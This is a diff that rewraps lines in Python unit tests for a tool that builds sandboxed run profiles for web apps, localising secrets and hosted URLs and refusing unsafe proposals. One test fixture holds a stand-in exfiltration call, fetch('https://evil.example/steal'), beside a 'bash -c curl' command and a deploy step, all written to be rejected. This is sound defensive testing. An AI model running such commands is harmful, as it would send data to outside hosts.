@@ -24,12 +24,14 @@ def project(files):
 
 
 VITE_APP = {
-    'app/package.json': {'name': 'shop', 'scripts': {'dev': 'vite', 'build': 'tsc && vite build', 'start': 'node server.js',
-                                                     'lint': 'eslint .', 'test': 'vitest run', 'typecheck': 'tsc --noEmit',
+    'app/package.json': {'name': 'shop', 'scripts': {'dev': 'vite', 'build': 'tsc && vite build',
+                                                     'start': 'node server.js', 'lint': 'eslint .',
+                                                     'test': 'vitest run', 'typecheck': 'tsc --noEmit',
                                                      'deploy': 'railway up', 'migrate': 'node migrate.js'},
                          'dependencies': {'react': '18', 'pg': '8'}, 'devDependencies': {'vite': '5'}},
     'app/package-lock.json': '{}',
-    'app/.env.example': 'DATABASE_URL=\nSESSION_SECRET=\nSTRIPE_API_URL=https://api.stripe.com\nLOG_LEVEL=info\nFEATURE_X=true\n',
+    'app/.env.example': 'DATABASE_URL=\nSESSION_SECRET=\nSTRIPE_API_URL=https://api.stripe.com\n'
+                        'LOG_LEVEL=info\nFEATURE_X=true\n',
     'app/.env': 'SESSION_SECRET=the-real-production-secret\n',
     'app/src/main.ts': 'const u = import.meta.env.VITE_API_URL; const m = process.env.MAIL_TOKEN;\n',
 }
@@ -49,7 +51,8 @@ class DetectTests(unittest.TestCase):
         self.assertEqual(profile['install'], [['npm', 'ci', '--no-audit', '--no-fund']])
         self.assertEqual(profile['start'][:2], ['npx', 'vite'])
         self.assertIn('127.0.0.1', profile['start'])
-        self.assertEqual(profile['checks'], [['npm', 'run', 'typecheck'], ['npm', 'run', 'lint'], ['npm', 'run', 'test']])
+        self.assertEqual(profile['checks'],
+                         [['npm', 'run', 'typecheck'], ['npm', 'run', 'lint'], ['npm', 'run', 'test']])
         self.assertEqual(profile['database'], {'kind': 'postgres', 'name': profile['database']['name']})
         self.assertEqual(profile['prepare'], [['npm', 'run', 'migrate']])
         self.assertEqual(profile['baseline']['build'], [['npm', 'run', 'build']])
@@ -57,7 +60,8 @@ class DetectTests(unittest.TestCase):
         self.assertEqual(env['DATABASE_URL'], '{database_url}')
         self.assertNotEqual(env['SESSION_SECRET'], 'the-real-production-secret')
         self.assertGreater(len(env['SESSION_SECRET']), 30)
-        self.assertEqual(env['STRIPE_API_URL'], 'http://127.0.0.1:9', 'a hosted service becomes an address nobody answers')
+        self.assertEqual(env['STRIPE_API_URL'], 'http://127.0.0.1:9',
+                         'a hosted service becomes an address nobody answers')
         self.assertEqual((env['LOG_LEVEL'], env['FEATURE_X']), ('info', 'true'))
         self.assertIn('VITE_API_URL', env)
         self.assertIn('MAIL_TOKEN', env)
@@ -69,35 +73,43 @@ class DetectTests(unittest.TestCase):
             self.assertEqual(live_setup.script_is_safe(scripts, name), safe, name)
         found = live_setup.detect(project({'package.json': {'scripts': {'dev': 'vercel dev', 'start': 'node s.js'}}}))
         self.assertEqual(found['profile']['start'], ['npm', 'run', 'start'])
-        pnpm = project({'package.json': {'scripts': {'dev': 'vite', 'lint': 'eslint .'}, 'devDependencies': {'vite': '5'}},
+        pnpm = project({'package.json': {'scripts': {'dev': 'vite', 'lint': 'eslint .'},
+                                         'devDependencies': {'vite': '5'}},
                         'pnpm-lock.yaml': 'lockfileVersion: 9\n'})
         with mock.patch('shutil.which', side_effect=lambda name: None if name == 'pnpm' else f'/usr/bin/{name}'):
             profile = live_setup.detect(pnpm)['profile']
-        self.assertEqual(profile['install'], [['corepack', 'pnpm', 'install', '--frozen-lockfile', '--config.strict-dep-builds=false']])
+        self.assertEqual(profile['install'], [['corepack', 'pnpm', 'install', '--frozen-lockfile',
+                                               '--config.strict-dep-builds=false']])
         self.assertEqual(profile['checks'], [['corepack', 'pnpm', 'run', 'lint']])
         # a Python app is no reason to give up: the draft starts nothing, and the assistant completes it from the
         # project's documentation
         python = live_setup.detect(project({'main.py': 'print(1)\n'}))
-        self.assertEqual((python['profile']['start'], python['profile']['app'], python['limitations']), (['true'], '.', []))
-        supabase = live_setup.detect(project({'package.json': {'scripts': {'dev': 'vite'}, 'devDependencies': {'vite': '5'},
+        self.assertEqual((python['profile']['start'], python['profile']['app'], python['limitations']),
+                         (['true'], '.', []))
+        supabase = live_setup.detect(project({'package.json': {'scripts': {'dev': 'vite'},
+                                                               'devDependencies': {'vite': '5'},
                                                                'dependencies': {'@supabase/supabase-js': '2'}}}))
         self.assertTrue(any('Supabase' in l for l in supabase['limitations']))
 
     def test_the_production_build_never_runs_the_dev_server(self):
-        dev_start = {'scripts': {'build': 'vite build', 'start': 'vite', 'dev': 'vite'}, 'devDependencies': {'vite': '5'}}
+        dev_start = {'scripts': {'build': 'vite build', 'start': 'vite', 'dev': 'vite'},
+                     'devDependencies': {'vite': '5'}}
         _, start = live_setup.production_commands('npm', dev_start, 4000)
         self.assertEqual(start[:3], ['npx', 'vite', 'preview'])
         self.assertEqual(live_setup.production_commands('npm', {'scripts': {'dev': 'node x'}}, 4000), (None, None))
         # a plain Node server has no build step: it is its own production
-        self.assertEqual(live_setup.production_commands('npm', {'scripts': {'start': 'node server.js'}}, 4000), ([], ['npm', 'run', 'start']))
+        self.assertEqual(live_setup.production_commands('npm', {'scripts': {'start': 'node server.js'}}, 4000),
+                         ([], ['npm', 'run', 'start']))
 
 
 class ProposalTests(unittest.TestCase):
     def test_an_address_off_this_computer_or_a_deploy_is_refused(self):
         self.assertEqual(run_profile.safe({'env': {'A': 'http://127.0.0.1:5000', 'DB': '{database_url}'},
-                                          'start': ['npx', 'vite'], 'seed_script': "fetch('http://localhost:3000/x')"}), [])
+                                           'start': ['npx', 'vite'],
+                                           'seed_script': "fetch('http://localhost:3000/x')"}), [])
         refused = run_profile.safe({'env': {'API': 'https://api.example.com'}, 'start': ['bash', '-c', 'curl x'],
-                                   'prepare': [['npx', 'vercel', 'deploy']], 'seed_script': "fetch('https://evil.example/steal')"})
+                                   'prepare': [['npx', 'vercel', 'deploy']],
+                                   'seed_script': "fetch('https://evil.example/steal')"})
         self.assertEqual(len(refused), 4)
         for words in ('api.example.com', 'bash -c', 'vercel deploy', 'evil.example'):
             self.assertTrue(any(words in reason for reason in refused), words)
@@ -115,14 +127,19 @@ class ProposalTests(unittest.TestCase):
 
     def test_a_proposal_replaces_the_environment_and_a_production_one_changes_the_baseline_only(self):
         runtime = Path(scratch())
-        run_profile.write_profile(runtime, {'schema_version': 1, 'install': [['npm', 'ci']], 'start': ['npx', 'vite'], 'port': 1,
-                                           'health': '/', 'env': {'OLD': '1', 'DATABASE_URL': '{database_url}'},
-                                           'prepare': [['npm', 'run', 'migrate']], 'database': {'kind': 'postgres', 'name': 'x'},
-                                           'baseline': {'build': [['npm', 'run', 'build']], 'start': ['npm', 'start'], 'env': {'OLD': '1'}}})
+        run_profile.write_profile(runtime, {'schema_version': 1, 'install': [['npm', 'ci']],
+                                            'start': ['npx', 'vite'], 'port': 1,
+                                            'health': '/', 'env': {'OLD': '1', 'DATABASE_URL': '{database_url}'},
+                                            'prepare': [['npm', 'run', 'migrate']],
+                                            'database': {'kind': 'postgres', 'name': 'x'},
+                                            'baseline': {'build': [['npm', 'run', 'build']],
+                                                         'start': ['npm', 'start'], 'env': {'OLD': '1'}}})
         # A proposal can say where the app keeps its language, so screens are pictured in more than one language.
-        profile = run_profile.apply(runtime, {'env': {'NEW': '2', 'DATABASE_URL': '{database_url}'}, 'prepare': [], 'database': 'none',
-                                             'fixtures': {'E2E_ID': '7'}, 'seed_script': 'console.log(1)',
-                                             'screens': {'lang_key': 'eaos.report.studio', 'lang_field': 'lang', 'shell': 'rm'}})
+        profile = run_profile.apply(runtime, {'env': {'NEW': '2', 'DATABASE_URL': '{database_url}'},
+                                              'prepare': [], 'database': 'none',
+                                              'fixtures': {'E2E_ID': '7'}, 'seed_script': 'console.log(1)',
+                                              'screens': {'lang_key': 'eaos.report.studio', 'lang_field': 'lang',
+                                                          'shell': 'rm'}})
         self.assertEqual(profile['screens'], {'lang_key': 'eaos.report.studio', 'lang_field': 'lang'})
         self.assertEqual(profile['env'], {'NEW': '2', 'E2E_ID': '7'})
         self.assertNotIn('prepare', profile)
@@ -130,19 +147,25 @@ class ProposalTests(unittest.TestCase):
         self.assertEqual(profile['seed'][0][0], 'node')
         self.assertTrue((runtime / 'setup/seed.cjs').is_file())
         self.assertEqual(oct((runtime / 'run.json').stat().st_mode & 0o777), '0o600')
-        profile = run_profile.apply(runtime, {'env': {'APP_URL': 'https://127.0.0.1:5', 'DATABASE_URL': '{database_url}'},
-                                             'build': [['npm', 'run', 'build:server']], 'seed_script': 'x'}, mode='baseline')
+        profile = run_profile.apply(runtime, {'env': {'APP_URL': 'https://127.0.0.1:5',
+                                                      'DATABASE_URL': '{database_url}'},
+                                              'build': [['npm', 'run', 'build:server']], 'seed_script': 'x'},
+                                    mode='baseline')
         self.assertEqual(profile['env'], {'NEW': '2', 'E2E_ID': '7'}, 'the lock run is untouched')
-        self.assertEqual(profile['baseline']['env'], {'APP_URL': 'https://127.0.0.1:5', 'DATABASE_URL': '{database_url}'})
+        self.assertEqual(profile['baseline']['env'],
+                         {'APP_URL': 'https://127.0.0.1:5', 'DATABASE_URL': '{database_url}'})
         self.assertEqual(profile['baseline']['build'], [['npm', 'run', 'build:server']])
         with mock.patch('eaos.live.app.run.Sandbox'), mock.patch('eaos.live.app.run.head', return_value='c'):
-            self.assertEqual(LiveRun('p', runtime, 'S05', mode='baseline').profile['seed'], [], 'the load test signs nobody in')
+            self.assertEqual(LiveRun('p', runtime, 'S05', mode='baseline').profile['seed'], [],
+                             'the load test signs nobody in')
             self.assertEqual(LiveRun('p', runtime, 'S05').profile['seed'][0][0], 'node')
 
 
 class VerifyTests(unittest.TestCase):
-    def test_a_stuck_page_is_no_working_app_the_assistant_is_asked_until_it_works_and_the_project_is_never_written(self):
-        page = {'text': 'Where are you working?', 'others': [{'text': 'Where are you  working?'}, {'text': 'Where are you working?'}]}
+    def test_a_stuck_page_is_no_working_app_the_assistant_is_asked_until_it_works_and_the_project_is_never_written(
+            self):
+        page = {'text': 'Where are you working?',
+                'others': [{'text': 'Where are you  working?'}, {'text': 'Where are you working?'}]}
         self.assertTrue(live_setup.stuck(page))
         page['others'][1]['text'] = 'People with access'
         self.assertFalse(live_setup.stuck(page))
